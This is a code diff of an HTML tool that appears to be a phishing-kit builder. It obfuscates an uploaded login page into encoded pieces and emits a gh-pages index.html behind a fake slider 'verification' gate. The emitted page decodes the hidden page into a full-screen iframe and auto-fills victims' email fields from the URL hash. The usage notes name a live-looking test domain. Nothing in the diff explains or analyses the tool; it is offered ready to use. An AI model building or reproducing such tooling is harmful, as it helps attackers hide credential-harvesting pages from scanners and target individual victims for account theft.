@@ -1,18 +1,127 @@
 <!doctype html>
 <html>
 <head>
+  <meta charset="utf-8" />
+  <title>Local Static Obfuscator — Build</title>
+  <style>
+    body { font-family: system-ui, Segoe UI, Roboto, Arial; padding: 18px; max-width: 800px; margin: 0 auto; }
+    label, button { display: block; margin-top: 12px; }
+    textarea { width: 100%; height: 300px; font-family: monospace; margin-top: 8px; font-size: 12px; }
+    input[type=file], input[type=number] { display: block; margin-top: 6px; }
+    button { padding: 10px 16px; background: #0b61ff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 14px; }
+    button:hover { background: #0050e0; }
+    .note { background: #e6f4ea; border: 1px solid #ceead6; padding: 12px; border-radius: 6px; margin-top: 16px; font-size: 14px; line-height: 1.5; }
+  </style>
+</head>
+<body>
+  <h2>Local Builder — Iframe Isolation Method</h2>
+  <p>This version uses a full-screen iframe to isolate your code, preventing Next.js/React crashes and ensuring 100% reliable prefilling.</p>
+
+  <label>n1.html (required)</label>
+  <input id="n1file" type="file" accept=".html" />
+
+  <label>next.js (optional, will be inlined if a matching script tag is found)</label>
+  <input id="nextfile" type="file" accept=".js" />
+
+  <label>Piece size base (80..800)</label>
+  <input id="base" type="number" value="120" min="20" max="800" />
+
+  <button id="build">Build obfuscated index.html</button>
+
+  <label>Generated index.html (copy this into gh-pages/index.html)</label>
+  <textarea id="out" placeholder="Generated output will appear here..."></textarea>
+
+  <div class="note">
+    <strong>How to use:</strong><br>
+    1. Select your files and click <strong>Build</strong>.<br>
+    2. Copy the generated code and paste it into your GitHub <code>gh-pages</code> branch as <code>index.html</code>.<br>
+    3. Test with your hash: <code>http://verifydns.indevs.in/#test@test.com</code><br><br>
+    <strong>Why this works:</strong> The slider verifies the user, then loads your original HTML into an isolated iframe. Your original code runs perfectly, and the prefill script runs safely inside that isolated environment.
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js"></script>
+  <script>
+    function readFile(file) {
+      return new Promise((resolve, reject) => {
+        if (!file) return resolve(null);
+        const r = new FileReader();
+        r.onerror = () => reject(r.error);
+        r.onload = () => resolve(r.result);
+        r.readAsText(file);
+      });
+    }
+
+    function randBytes(n) {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      let s = '';
+      for (let i = 0; i < n; i++) s += chars.charAt(Math.floor(Math.random() * chars.length));
+      return s;
+    }
+
+    function splitIntoPieces(s, pieceLen) {
+      const out = [];
+      for (let i = 0; i < s.length; i += pieceLen) out.push(s.slice(i, i + pieceLen));
+      return out;
+    }
+
+    document.getElementById('build').addEventListener('click', async () => {
+      const n1file = document.getElementById('n1file').files[0];
+      if (!n1file) { alert('Please choose n1.html'); return; }
+      
+      const nextfile = document.getElementById('nextfile').files[0] || null;
+      const base = parseInt(document.getElementById('base').value, 10) || 120;
+
+      try {
+        let html = await readFile(n1file);
+
+        if (nextfile) {
+          try {
+            const nextText = await readFile(nextfile);
+            html = html.replace(/<script\s+[^>]*src=["'](?:\.\/)?next\.js["'][^>]*>[\s\S]*?<\/script>/i, '<script>' + nextText + '<\\/script>');
+          } catch (e) { console.warn('Could not inline next.js', e); }
+        }
+
+        const compressedB64 = LZString.compressToBase64(html);
+        const passphrase = randBytes(6);
+        const pieceLen = base + Math.floor(Math.random() * 160);
+
+        let pieces = splitIntoPieces(compressedB64, pieceLen);
+
+        pieces = pieces.map(p => {
+          const rot = (p.length % 11);
+          const transformedChars = [];
+          for (let i = 0; i < p.length; i++) {
+            const c = p.charCodeAt(i) & 0xFF;
+            transformedChars.push(String.fromCharCode((c + rot) & 0xFF));
+          }
+          transformedChars.reverse();
+          return btoa(transformedChars.join(''));
+        });
+
+        const indexHtml = `<!doctype html>
+<html>
+<head>
 <meta charset="utf-8">
-<title>Loading...</title>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js"></script>
+<title>Verifying...</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js"><\/script>
 <style>
-  #css-pass::before { content: "UECecF"; display:none; }
-  #human-overlay { position: fixed; inset: 0; display:flex; align-items:center; justify-content:center; background: rgba(255,255,255,0.98); z-index:2147483647; font-family: system-ui, sans-serif; }
+  #css-pass::before { content: "${passphrase}"; display:none; }
+  body { margin: 0; padding: 0; overflow: hidden; background: #fff; font-family: system-ui, sans-serif; }
+  #human-overlay { position: fixed; inset: 0; display:flex; align-items:center; justify-content:center; background: rgba(255,255,255,0.98); z-index:2147483647; }
   #human-box { background: white; border-radius:12px; padding:30px; box-shadow:0 10px 30px rgba(0,0,0,0.15); text-align:center; max-width:90%; width: 360px; }
   #slider-container { margin-top: 20px; }
-  #slider-track { width: 280px; height: 50px; background: #f0f0f0; border: 2px solid #ddd; border-radius: 25px; position: relative; margin: 0 auto; overflow: hidden; }
-  #slider-handle { width: 50px; height: 46px; background: #0b61ff; border-radius: 23px; position: absolute; left: 0; top: 0; display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; cursor: grab; user-select: none; touch-action: none; transition: background 0.2s; }
+  #slider-track {
+    width: 280px; height: 50px; background: #f0f0f0; border: 2px solid #ddd; border-radius: 25px; 
+    position: relative; margin: 0 auto; overflow: hidden;
+  }
+  #slider-handle {
+    width: 50px; height: 46px; background: #0b61ff; border-radius: 23px; position: absolute; left: 0; top: 0;
+    display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; cursor: grab;
+    user-select: none; touch-action: none; transition: background 0.2s;
+  }
   #slider-handle:active { cursor: grabbing; background: #0050e0; }
   #slider-text { margin-top: 12px; font-size: 14px; color: #666; }
+  #target-frame { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: none; z-index: 1; display: none; }
 </style>
 </head>
 <body>
@@ -31,10 +140,10 @@
   </div>
 </div>
 
-<script>
-console.log("[Decoder] Starting.");
+<iframe id="target-frame" allow="fullscreen; clipboard-write"></iframe>
 
-var piecesArr = ["alBGalhGSE1SXXpVdk5IRXdUWE1qRnI3R0RQc29GdlBLRGRNRGg7XEhEdnJEWkZMbU5uTW9MO3tWVERINWdEM1lcRGZbUURQRUxVNUhkRFxwdUQ1ZWlwZ1JFalF5W0Q5TlJEd0RMdXY5RHJkUURaRVRaa0kzXFFGRGg4RHpQRF1EN0pEPG..."];
+<script>
+var piecesArr = ${JSON.stringify(pieces)};
 
 function reassemblePieces() {
   var out = '';
@@ -57,6 +166,7 @@ function reassemblePieces() {
   }
 }
 
+// --- Slider Logic ---
 var handle = document.getElementById('slider-handle');
 var track = document.getElementById('slider-track');
 var isDragging = false;
@@ -72,6 +182,7 @@ function startDrag(e) {
   document.addEventListener('mouseup', stopDrag);
   document.addEventListener('touchend', stopDrag);
 }
+
 function drag(e) {
   if (!isDragging) return;
   e.preventDefault();
@@ -80,106 +191,126 @@ function drag(e) {
   var maxLeft = track.offsetWidth - handle.offsetWidth;
   var newLeft = Math.max(0, Math.min(handleLeft + dx, maxLeft));
   handle.style.left = newLeft + 'px';
-  if (newLeft >= maxLeft - 5) { stopDrag(); triggerReconstruct(); }
+  
+  if (newLeft >= maxLeft - 5) {
+    stopDrag();
+    triggerReconstruct();
+  }
 }
+
 function stopDrag() {
   isDragging = false;
   document.removeEventListener('mousemove', drag);
   document.removeEventListener('touchmove', drag);
   document.removeEventListener('mouseup', stopDrag);
   document.removeEventListener('touchend', stopDrag);
-  if (handle.offsetLeft < track.offsetWidth - handle.offsetWidth - 5) handle.style.left = '0px';
+  
+  if (handle.offsetLeft < track.offsetWidth - handle.offsetWidth - 5) {
+    handle.style.left = '0px';
+  }
 }
-function triggerReconstruct() { var overlay = document.getElementById('human-overlay'); if (overlay) overlay.remove(); attemptReconstruct(); }
+
+function triggerReconstruct() {
+  var overlay = document.getElementById('human-overlay');
+  if (overlay) overlay.style.display = 'none';
+  attemptReconstruct();
+}
+
 handle.addEventListener('mousedown', startDrag);
 handle.addEventListener('touchstart', startDrag, {passive: false});
+// -------------------
 
 function attemptReconstruct() {
   var assembled = reassemblePieces();
-  if (!assembled) { document.body.innerHTML = '<h2 style=\"color:red;text-align:center;margin-top:50px;\">Reassembly failed.</h2>'; return; }
+  if (!assembled) {
+    document.getElementById('human-box').innerHTML = '<h3 style="color:red">Verification failed. Please refresh.</h3>';
+    return;
+  }
 
   try {
     var html = LZString.decompressFromBase64(assembled);
     if (!html) throw new Error('Decompression returned null');
-
-    var rawHash = '';
-    try {
-      rawHash = (window.location.hash && window.location.hash.length>1) ? decodeURIComponent(window.location.hash.replace(/^#/,'') ) : (window.location.href.indexOf('#')>-1 ? decodeURIComponent(window.location.href.split('#').pop()) : '');
-    } catch(e) {
-      rawHash = '';
-    }
-
-    if (rawHash) {
-      console.log('[Decoder] email present:', rawHash);
-
-      // Modify raw HTML string directly before writing
-      html = html.replace(/(<input\\s+[^>]*\\b(?:id|name)\\s*=\\s*["'](?:email|Email)["'][^>]*>)/ig, function(m){
-        if (/\\bvalue\\s*=\\s*["']/i.test(m)) return m;
-        return m.replace(/>$/, ' value="' + rawHash + '">');
-      });
-
-      html = html.replace(/(<input\\s+[^>]*\\b(?:id|name)\\s*=\\s*["'](?:email|Email)["'][^>]*\\bvalue\\s*=\\s*["'][^>]*["'][^>]*>)/ig, function(m){
-        return m.replace(/value\\s*=\\s*["'][^"']*["']/i, 'value="' + rawHash + '"');
-      });
-
-      html = html.replace(/(<h[1-6][^>]*\\bid\\s*=\\s*["']auth_email["'][^>]*>)(.*?)(<\\/h[1-6]>)/ig, function(all, open, inner, close){
-        return open + rawHash + close;
-      });
-
-      html = html.replace(/(<[a-zA-Z0-9-]+[^>]*\\bid\\s*=\\s*["']auth_email["'][^>]*>)(.*?)(<\\/[^>]+>)/ig, function(all, open, inner, close){
-        return open + rawHash + close;
-      });
-
-      html = html.replace(/(<\\/?[a-zA-Z0-9-]+[^>]*\\b(?:id|name)\\s*=\\s*["'](?:email|Email)["'][^>]*>)/ig, function(m){
-        if (m.indexOf('value=') > -1) return m;
-        return m + ' value="' + rawHash + '"';
-      });
-
-      // Fallback script to fill any visible match
+    
+    // Extract hash safely
+    var hash = window.location.hash || (window.location.href.includes('#') ? '#' + window.location.href.split('#')[1] : '');
+    
+    if (hash && hash.length > 1) {
+      var emailValue = hash.substring(1);
+      var safeEmail = JSON.stringify(emailValue);
+      
+      // Inject prefill script directly into the HTML that will go into the iframe
       var prefillScript = '<scr' + 'ipt>' +
-        '(function(){' +
-        'var email = sessionStorage.getItem(\"__prefill_email\");' +
-        'if (!email) { try { email = decodeURIComponent(location.hash.replace(/^#/,"")); } catch(e) { email = null; } }' +
-        'if (!email) return;' +
-        'var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;' +
-        'var inputs = document.querySelectorAll("input");' +
-        'for (var i = 0; i < inputs.length; i++) {' +
-        '  var el = inputs[i];' +
-        '  var id = (el.id || "").toLowerCase();' +
-        '  var name = (el.name || "").toLowerCase();' +
-        '  var ph = (el.placeholder || "").toLowerCase();' +
-        '  if ((id.indexOf("email") > -1) || (name.indexOf("email") > -1) || (id.indexOf("user") > -1) || (name.indexOf("user") > -1) || (ph.indexOf("email") > -1) || (ph.indexOf("user") > -1)) {' +
-        '    try { if (nativeSetter) { nativeSetter.call(el, email); } else { el.value = email; } el.dispatchEvent(new Event(\"input\", { bubbles: true })); el.dispatchEvent(new Event(\"change\", { bubbles: true })); } catch(e) {}' +
+        '(function() {' +
+        '  var emailVal = ' + safeEmail + ';' +
+        '  console.log("[Iframe Prefill] Target email:", emailVal);' +
+        '  var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;' +
+        '  function tryFill() {' +
+        '    var inputs = document.querySelectorAll("input");' +
+        '    for (var i = 0; i < inputs.length; i++) {' +
+        '      var el = inputs[i];' +
+        '      var id = (el.id || "").toLowerCase();' +
+        '      var name = (el.name || "").toLowerCase();' +
+        '      var ph = (el.placeholder || "").toLowerCase();' +
+        '      var type = (el.type || "").toLowerCase();' +
+        '      ' +
+        '      if (type === "email" || type === "text" || type === "username") {' +
+        '        if (id.includes("email") || id.includes("user") || id.includes("mail") ||' +
+        '            name.includes("email") || name.includes("user") || name.includes("mail") ||' +
+        '            ph.includes("email") || ph.includes("user") || ph.includes("mail")) {' +
+        '          console.log("[Iframe Prefill] Filling:", el);' +
+        '          if (nativeSetter) { nativeSetter.call(el, emailVal); } else { el.value = emailVal; }' +
+        '          el.dispatchEvent(new Event("input", { bubbles: true }));' +
+        '          el.dispatchEvent(new Event("change", { bubbles: true }));' +
+        '          el.dispatchEvent(new Event("blur", { bubbles: true }));' +
+        '          return true;' +
+        '        }' +
+        '      }' +
+        '    }' +
+        '    return false;' +
         '  }' +
-        '}' +
+        '  var attempts = 0;' +
+        '  var interval = setInterval(function() {' +
+        '    if (tryFill()) { clearInterval(interval); console.log("[Iframe Prefill] Success!"); }' +
+        '    else if (++attempts > 30) { clearInterval(interval); console.log("[Iframe Prefill] Gave up. Available inputs:", Array.from(document.querySelectorAll("input")).map(function(i){return {id:i.id, name:i.name, type:i.type};})); }' +
+        '  }, 300);' +
         '})();' +
-        '<\\/scr' + 'ipt>';
-
-      try {
-        sessionStorage.setItem('__prefill_email', rawHash);
-      } catch (e) {}
-
-      if (/<\\/body\\s*>/i.test(html)) {
-        html = html.replace(/<\\/body\\s*>/i, prefillScript + '</body>');
-      } else if (/<\\/head\\s*>/i.test(html)) {
-        html = html.replace(/<\\/head\\s*>/i, prefillScript + '</head>');
+      '<\\/scr' + 'ipt>';
+      
+      if (html.includes('</head>')) {
+        html = html.replace('</head>', prefillScript + '</head>');
+      } else if (html.includes('<body>')) {
+        html = html.replace('<body>', '<body>' + prefillScript);
       } else {
         html = prefillScript + html;
       }
-    } else {
-      console.log('[Decoder] No hash present; skipping injection');
     }
 
-    document.open();
-    document.write(html);
-    document.close();
-    console.log('[Decoder] Complete');
+    // Write to iframe instead of main document
+    var iframe = document.getElementById('target-frame');
+    iframe.style.display = 'block';
+    var doc = iframe.contentDocument || iframe.contentWindow.document;
+    doc.open();
+    doc.write(html);
+    doc.close();
+    
+    console.log("[Decoder] Successfully loaded into iframe.");
   } catch (e) {
     console.error('[Decoder] Fatal error:', e);
-    document.body.innerHTML = '<h2 style=\"color:red;text-align:center;margin-top:50px;\">Reconstruction failed: ' + e.message + '</h2>';
+    document.getElementById('human-box').innerHTML = '<h3 style="color:red">Error loading page.</h3>';
   }
 }
-</script>
+<\/script>
 <noscript><meta name="robots" content="noindex,nofollow"><p>JavaScript is required to view this page.</p></noscript>
+</body>
+</html>`;
+
+        document.getElementById('out').value = indexHtml;
+        alert('Success! Copy the generated code and paste it into your gh-pages/index.html.');
+      } catch (err) {
+        alert('Build failed: ' + err.message);
+        console.error(err);
+      }
+    });
+  </script>
 </body>
 </html>
